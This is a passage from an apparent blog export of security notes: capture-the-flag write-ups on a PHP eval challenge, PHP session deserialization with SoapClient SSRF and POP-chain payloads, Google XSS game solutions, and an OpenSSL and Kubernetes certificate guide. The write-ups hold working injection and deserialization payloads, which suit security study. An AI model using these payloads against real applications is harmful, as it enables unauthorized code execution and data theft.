style=\"color:#a6e22e\"\u003eis_valid_url\u003c/span\u003e($url) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003efilter_var\u003c/span\u003e($url, \u003cspan style=\"color:#a6e22e\"\u003eFILTER_VALIDATE_URL\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epreg_match\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/data:\\/\\//i\u0026#39;\u003c/span\u003e, $url)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eisset\u003c/span\u003e($_POST[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;url\u0026#39;\u003c/span\u003e])){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    $url \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $_POST[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;url\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eis_valid_url\u003c/span\u003e($url)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $r \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eparse_url\u003c/span\u003e($url);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epreg_match\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/baidu\\.com$/\u0026#39;\u003c/span\u003e, $r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;host\u0026#39;\u003c/span\u003e])) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            $code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efile_get_contents\u003c/span\u003e($url);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;;\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epreg_replace\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/[a-z]+\\((?R)?\\)/\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e, $code)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epreg_match\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i\u0026#39;\u003c/span\u003e, $code)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bye~\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eeval\u003c/span\u003e($code);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error: host not allowed\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error: invalid url\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ehighlight_file\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003e__FILE__\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload\u003c/p\u003e","title":"bytectf2019"},{"content":"php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:\nsession反序列化漏洞 特征 phpinfo中默认的session.serialize_handler和本地的值不一样 ini_set(\u0026lsquo;session.serialize_handler\u0026rsquo;, \u0026lsquo;php\u0026rsquo;);之类的 phpinfo中session.upload_progress.enabled打开 一旦发现脚本中的序列化处理器和php.ini设置的不一样,就可能导致这个漏洞.\nphp 的 session 都是以文件的形式进行存储的, 常见的位置如下\n/var/lib/php/sess_xxxxx /var/lib/php/sessions/sess_xxxxx /tmp/sess_xxxxx /tmp/sessions/sess_xxxxx php用于存取session时候的三种处理器\nphp:键名 ＋ 竖线 ＋ 序列化字符串 php_binary: 键名的长度对应的 ASCII 字符 ＋ 键名 ＋序列化字符串 php_serialize: 序列化字符串 在没有对session进行配置的情况下, 默认使用php序列化处理模式.\n如果以php_serialize 方式存取但是又用php处理器去处理, 那么只要传入的字符串中有 | 就可以导致php处理器将 | 前的东东解释成键, 而将后面的东西解释称值, 而后面的东西一般就是要反序列化的字符串了.\nphp5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session, 所以这个洞要看版本\n将payload传入session的方式有两种, 一种是对面开放本地可控的数据, 另一种是因为配置不当造成session可控\n当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$SESSION中。\n_当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时， 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。\n上传表单\n\u0026lt;form action=\u0026#34;http://web.jarvisoj.com:32784/index.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; value=\u0026#34;123\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 其中目标网址需要替换, php_session_upload_progress是session.upload_progress.name的名字, 从phpinfo中看.\n然后随便传点什么进去. 在burpsuite中做如下修改\n将随便传的文件的filename成payload, 比如\n|O:5:\\\u0026#34;OowoO\\\u0026#34;:1:{s:4:\\\u0026#34;mdzz\\\u0026#34;;s:36:\\\u0026#34;print_r(scandir(dirname(__FILE__)));\\\u0026#34;;} 这里的斜杆是为了防止转义.签名的竖线就是帮助php处理器解释使用的.\n例题LCTF2018-bestphp’s revenge 题目直接给出了源代码\n\u0026lt;?php highlight_file(__FILE__); $b = \u0026#39;implode\u0026#39;; call_user_func($_GET[\u0026#39;f\u0026#39;], $_POST); session_start(); if (isset($_GET[\u0026#39;name\u0026#39;])) { $_SESSION[\u0026#39;name\u0026#39;] = $_GET[\u0026#39;name\u0026#39;]; } var_dump($_SESSION); $a = array(reset($_SESSION), \u0026#39;welcome_to_the_lctf2018\u0026#39;); call_user_func($b, $a); ?\u0026gt; 整理一下\ncall_user_func: 第一个参数是回调函数的名字,第二个之后的参数是回调函数的参数,特别的,如果传入的是一个数组的话,他会将数组的第一项识别为类和对象,并将之后的参数作为类和对象的方法来调用.\nreset会将数组的第一项作为字符串输出\nimplode 函数只是合并数组的时候插入一些给定字符而已,无关紧要.\n扫描目录发现了flag.php\nsession_start(); echo \u0026#39;only localhost can get flag!\u0026#39;; $flag = \u0026#39;LCTF{*************************}\u0026#39;; if($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]===\u0026#34;127.0.0.1\u0026#34;){ $_SESSION[\u0026#39;flag\u0026#39;] = $flag; } only localhost can get flag! 规定localhost访问,那么必须要找到ssrf的机会.\n题目提示反序列化,但是题目源码中没有任何给定的类,在此情况下只能考虑php的原生类.本题采用的是SoapClient类.在这个类的对象调用未知的方法时候就会调用call函数,同时触发请求,这个类支持http/https, 简单的使用实例如下:\n\u0026lt;?php $url = \u0026#34;http://127.0.0.1:12334/flag.php\u0026#34;; $b = new SoapClient(null, array(\u0026#39;uri\u0026#39; =\u0026gt; $url, \u0026#39;location\u0026#39; =\u0026gt;$url)); $a = serialize($b); $c = unserialize($a); $c-\u0026gt;a(); ?\u0026gt; nc 接受:\n那么可以这样子:\ncall_user_func(\u0026lsquo;session_start\u0026rsquo;,\u0026lsquo;serialize_handler=php_serialize\u0026rsquo;)提前开启php session并规定好本地的serialize_handler为php_serialize, 而默认的session序列化处理器为php,这就会导致上面说到的session反序列化漏洞.当然,name的值是竖线加上SoapClient序列化字符串,uri和location的值都指向flag.php session存取完成之后就要想办法去反序列化和触发未知方法,这里使用变量覆盖(extract)将b覆盖为call_user_func,因为b有机会接受session反序列化的字符串,并将数组传入b中,调用welcome_to_the_lctf2018方法,从而触发call函数,造成ssrf 最后ssrf的结果也会存放在sessoin中,所以获取SoapClient的PHPSSID并去访问index.php(里面有var_dump(session))得到flag SWPUCTF 2019 web6 前面部分省略, 来到源码部分\n\u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); class aa { public $mod1; public $mod2; public function __call($name,$param) { if($this-\u0026gt;{$name}) { $s1 = $this-\u0026gt;{$name}; $s1(); } } public function __get($ke) { return $this-\u0026gt;mod2[$ke]; } } class bb { public $mod1; public $mod2; public function __destruct() { $this-\u0026gt;mod1-\u0026gt;test2(); } } class cc { public $mod1; public $mod2; public $mod3; public function __invoke() { $this-\u0026gt;mod2 = $this-\u0026gt;mod3.$this-\u0026gt;mod1; } } class dd { public $name; public $flag; public $b; public function getflag() { session_start(); var_dump($_SESSION); $a = array(reset($_SESSION),$this-\u0026gt;flag); echo call_user_func($this-\u0026gt;b,$a); } } class ee { public $str1; public $str2; public function __toString() { $this-\u0026gt;str1-\u0026gt;{$this-\u0026gt;str2}(); return \u0026#34;1\u0026#34;; } } $a = $_POST[\u0026#39;aa\u0026#39;]; unserialize($a); ?\u0026gt; ssrf生成session反序列化\n\u0026lt;?php $target = \u0026#39;http://127.0.0.1/interface.php\u0026#39;; $headers = array( \u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39;, \u0026#39;Cookie: user=xZmdm9NxaQ==\u0026#39;, ); $b = new SoapClient(null, array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;wupco^^Content-Type: application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers),\u0026#39;uri\u0026#39;=\u0026gt;\u0026#39;aabb\u0026#39;)); $a = serialize($b); $a = str_replace(\u0026#39;^^\u0026#39;, \u0026#34;\\r\\n\u0026#34;, $a); echo $a; // echo urlencode($a); 序列化生成, 触发反序列化后进而触发session的反序列化\n$first = new bb(); $second = new aa(); $third = new cc(); $four = new ee(); $first -\u0026gt;mod1 = $second; $third -\u0026gt; mod1 = $four; $f = new dd(); $f-\u0026gt;flag=\u0026#39;Get_flag\u0026#39;; $f-\u0026gt;b=\u0026#39;call_user_func\u0026#39;; $four -\u0026gt; str1 = $f; $four -\u0026gt; str2 = \u0026#34;getflag\u0026#34;; $second -\u0026gt;mod2[\u0026#39;test2\u0026#39;] = $third; echo serialize($first); PHPSESSID随便指定写一个比如kk默认情况下会生成sess_kk session文件\n参考\nhttps://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/\nhttp://www.91ri.org15925.html\nhttps://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO\nhttps://blog.spoock.com/2016/10/16/php-serialize-problem/\nhttps://www.freebuf.com/vuls/202819.html\n","permalink":"https://ch3n9w.github.io/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"\u003cp\u003ephp中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:\u003c/p\u003e","title":"php session反序列化"},{"content":" 来看看互联网世界的基石\n通信过程的简化模型 第一阶段: 服务器向CA发起证书签名请求 服务器组织生成一个私钥\nopenssl genrsa -out target.key 1024 从私钥文件中得到公钥, 这个公钥会被用于给CA签名\nopenssl rsa -in target.key -pubout -out target_pub.key 使用私钥生成一个证书签名请求, 在生成过程中需要填写证书申请人的一些信息\nopenssl req -new -key target.key -out target.csr 生成完成后, 可以运行下面命令看看这个证书签名请求文件里都有什么\nopenssl req -text -in target.csr -verify 例如:\n可以看到公钥也在里面.\n接下来把证书签名请求文件提交给CA, CA审核通过后对该文件进行签名\nopenssl x509 -in target.csr -out target.crt -req -signkey ca.key -days 365 target.crt就是签名成功后的证书. 对于常见的自签名场景来说, ca.key就是target.key, 用自己的密钥去签名自己的证书请求, 自签名请求命令就是\nopenssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 然后CA将target.crt以及由Root CA签名的CA证书一同返回给申请人. 如下图所示:\nRoot CA的证书就那么几个, 内置在操作系统里, 受到所有程序的信任, 因此申请人得到由Root CA签名的CA证书后, 就可以信任该CA组织, 进而可以信任该CA组织签发给自己的证书. 对于其他的客户端而言也是这样.\n第二阶段 客户访问服务端 客户端发起请求, 服务端会把自己的证书和签自己证书的CA机构的证书一起发过去\n如图, 由于Root CA是可信任的, 因此该CA机构是可信任的, 因此该CA机构签发的服务端证书也是可信任的, 这叫 信任链.\n信任建立之后, 客户端生成一个对称密钥, 用服务端证书里的公钥加密之后发送给服务端, 最后双方都用这个对称密钥来加密数据进行信息交换 (实际上, 对称密钥的生成是服务端和客户端通过彼此协商过程中的各种消息各自使用相同的算法生成的, 并不会直接在网络上传输, 只不过这些消息中有一部分是公钥加密后传输的, 因此也类似于将对称密钥进行公钥加密了)\n信息提取 生成一个包含密钥和公钥的文件,既可以用来加密也可以用来解密.\nopenssl genrsa -out target.key 1024 从这个包含公钥和私钥的文件中提取出公钥\nopenssl rsa -in target.key -pubout -out target_pub.key 从公钥中提取rsa公钥信息\nopenssl rsa -pubin -in (filename) -text 提取其中模数\nopenssl rsa -pubin -in (filename) -text -modulus 加密解密 公钥加密\nopenssl rsautl -encrypt -in target -out target.enc -inkey target_pub.pem -pubin 私钥解密\nopenssl rsautl -decrypt -in target.enc -out target -inkey target_pri.pem 用三种填充方式解密,(第一种没有填充)\nopenssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec -oaep openssl rsautl -decrypt -in flag.enc-inkey private.key -out flag.dec -pkcs K8s场景下的证书管理 首先为集群生成一个证书, 代表CA签发机构\n# 生成2048位的包含公钥和私钥的文件 openssl genrsa -out ca.key 2048 # 在ca.key文件基础上生成ca.crt openssl req -x509 -new -nodes -key ca.key -subj \u0026#34;/CN=${MASTER_IP}\u0026#34; -days 10000 -out ca.crt 然后创建一个服务端证书\n# 生成一个2048位的server.key文件 openssl genrsa -out server.key 2048 创建一个用于生成证书签名请求（CSR）的配置文件。 保存文件（例如：csr.conf）前，记得用真实值替换掉尖括号中的值（例如：\u0026lt;MASTER_IP\u0026gt;）。 注意：MASTER_CLUSTER_IP 就像前一小节所述，它的值是 API 服务器的服务集群 IP。 下面的例子假定你的默认 DNS 域名为 cluster.local。\n[ req ] default_bits = 2048 prompt = no default_md = sha256 req_extensions = req_ext distinguished_name = dn [ dn ] C = \u0026lt;country\u0026gt; ST = \u0026lt;state\u0026gt; L = \u0026lt;city\u0026gt; O = \u0026lt;organization\u0026gt; OU = \u0026lt;organization unit\u0026gt; CN = \u0026lt;MASTER_IP\u0026gt; [ req_ext ] subjectAltName = @alt_names [ alt_names ] DNS.1 = kubernetes DNS.2 = kubernetes.default DNS.3 = kubernetes.default.svc DNS.4 = kubernetes.default.svc.cluster DNS.5 = kubernetes.default.svc.cluster.local IP.1 = \u0026lt;MASTER_IP\u0026gt; IP.2 = \u0026lt;MASTER_CLUSTER_IP\u0026gt; [ v3_ext ] authorityKeyIdentifier=keyid,issuer:always basicConstraints=CA:FALSE keyUsage=keyEncipherment,dataEncipherment extendedKeyUsage=serverAuth,clientAuth subjectAltName=@alt_names # 基于上面的配置文件生成证书签名请求 openssl req -new -key server.key -out server.csr -config csr.conf # 基于 ca.key、ca.crt 和 server.csr 等三个文件生成服务端证书： openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key \\ -CAcreateserial -out server.crt -days 10000 \\ -extensions v3_ext -extfile csr.conf -sha256 # 查看证书签名请求： openssl req -noout -text -in ./server.csr # 查看证书 openssl x509 -noout -text -in ./server.crt 完成之后, 将证书们添加到API Server的配置文件中\n--client-ca-file=/yourdirectory/ca.crt --tls-cert-file=/yourdirectory/server.crt --tls-private-key-file=/yourdirectory/server.key 在kubectl的配置文件中加入用户证书来添加用户(minikube场景) 为什么客户端也需要证书呢? 因为kubectl 请求api server的过程是一个双向认证的过程, 不仅仅是客户端需要验证服务器的身份, 服务器也需要验证客户端的身份来完成权限鉴定.\n参考https://medium.com/@HoussemDellai/rbac-with-kubernetes-in-minikube-4deed658ea7b\n创建用户证书\nmkdir cert \u0026amp;\u0026amp; cd cert openssl genrsa -out user1.key 2048 openssl req -new -key user1.key -out user1.csr -subj “/CN=user1/O=group1” # 使用minikube的ca来签发用户证书 openssl x509 -req -in user1.csr -CA ~/.minikube/ca.crt -CAkey ~/.minikube/ca.key -CAcreateserial -out user1.crt -days 500 kubectl临时使用该用户证书\nkubectl config set-credentials user1 --client-certificate=user1.crt --client-key=user1.key kubectl检查配置\nkubectl config view 要将该用户设置成默认角色, 在.kube/config中添加证书, 例如\napiVersion: v1 clusters: - cluster: certificate-authority: /home/ch4ser/.minikube/ca.crt extensions: - extension: last-update: Wed, 15 Feb 2023 14:46:55 CST provider: minikube.sigs.k8s.io version: v1.28.0 name: cluster_info server: https://192.168.49.2:8443 name: minikube contexts: - context: cluster: minikube extensions: - extension: last-update: Wed, 15 Feb 2023 14:46:55 CST provider: minikube.sigs.k8s.io version: v1.28.0 name: context_info namespace: default user: minikube name: minikube - context: cluster: minikube user: user1 name: user1-context current-context: minikube kind: Config preferences: {} users: - name: minikube user: client-certificate: /home/ch4ser/.minikube/profiles/minikube/client.crt client-key: /home/ch4ser/.minikube/profiles/minikube/client.key - name: user1 user: client-certificate: /home/ch4ser/CloudWorkspace/cert/user1.crt client-key: /home/ch4ser/CloudWorkspace/cert/user1.key 切换上下文\nkubectl config use-context user1-context # check kubectl config current-context # 切回去 kubectl config use-context minikube ps: kubectl 设置用户证书去访问的时候, \u0026ndash;token选项不会生效, 无法使用token去代表sa\n请求 kubernetes API server 需要使用证书去请求, 查看.kube/config得到kubectl证书之后:\ncurl --cert /home/ch4ser/.minikube/profiles/minikube/client.crt --key /home/ch4ser/.minikube/profiles/minikube/client.key -k https://192.168.49.2:8443/api/v1/namespaces 其中192.168.49.2:8443是.kube/config中的API server 地址\n速查: https://help.aliyun.com/document_detail/160530.html\n其他 TLS 是 SSL V2 标准化后的产物, 事实上现在大家用的都是tls, 只是习惯了ssl这个称呼 在网站启用https之后, 使用http访问会被重定向到443端口上以使用https服务 如果请求中的cookie中有secure属性, 浏览器只会允许该请求发送到https服务中, 而不是http (除了发往localhost) Insecure sites (with http: in the URL) can\u0026rsquo;t set cookies with the Secure attribute. 涉及到nginx配置反向代理到https中存在的坑可以参考 link\n","permalink":"https://ch3n9w.github.io/posts/tech-openssl/","summary":"\u003cblockquote\u003e\n\u003cp\u003e来看看互联网世界的基石\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"通信过程的简化模型\"\u003e通信过程的简化模型\u003c/h2\u003e\n\u003ch3 id=\"第一阶段-服务器向ca发起证书签名请求\"\u003e第一阶段: 服务器向CA发起证书签名请求\u003c/h3\u003e\n\u003cp\u003e服务器组织生成一个私钥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl genrsa -out target.key \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e从私钥文件中得到公钥, 这个公钥会被用于给CA签名\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl rsa -in target.key -pubout -out target_pub.key\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用私钥生成一个证书签名请求, 在生成过程中需要填写证书申请人的一些信息\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -new -key target.key -out target.csr\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e生成完成后, 可以运行下面命令看看这个证书签名请求文件里都有什么\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -text -in target.csr  -verify\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e例如:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20221223112026855.png\" alt=\"image-20221223112026855\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e可以看到公钥也在里面.\u003c/p\u003e\n\u003cp\u003e接下来把证书签名请求文件提交给CA, CA审核通过后对该文件进行签名\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl x509 -in target.csr -out target.crt -req -signkey ca.key -days \u003cspan style=\"color:#ae81ff\"\u003e365\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003etarget.crt就是签名成功后的证书. 对于常见的自签名场景来说, \u003ccode\u003eca.key\u003c/code\u003e就是\u003ccode\u003etarget.key\u003c/code\u003e, 用自己的密钥去签名自己的证书请求, 自签名请求命令就是\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl x509 -in target.csr -out target.crt -req -signkey target.key -days \u003cspan style=\"color:#ae81ff\"\u003e365\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后CA将target.crt以及由Root CA签名的CA证书一同返回给申请人. 如下图所示:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"19QiVdLVN-6NCQPy7Zla1BA.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e","title":"证书相关"},{"content":"Google Xss game Level 3 This website provides some API (after the arch pointer).\nsolution:\nhttps://xss-game.appspot.com/level3/frame#\u0026lt;img src='foo' onerror=alert();\u0026gt;\nlevel 4 \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;script\u0026gt; function startTimer(seconds) { seconds = parseInt(seconds) || 3; setTimeout(function() { window.confirm(\u0026#34;Time is up!\u0026#34;); window.history.back(); }, seconds * 1000); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level4\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level4.png\u0026#34; /\u0026gt; \u0026lt;br\u0026gt; \u0026lt;img src=\u0026#34;/static/loading.gif\u0026#34; onload=\u0026#34;startTimer(\u0026#39;{{ timer }}\u0026#39;);\u0026#34; /\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div id=\u0026#34;message\u0026#34;\u0026gt;Your timer will execute in {{ timer }} seconds.\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; solution:\nhttps://xss-game.appspot.com/level4/frame?timer=\u0026#39;);alert(\u0026#39; level 5 \u0026lt;!--signup.html--\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script 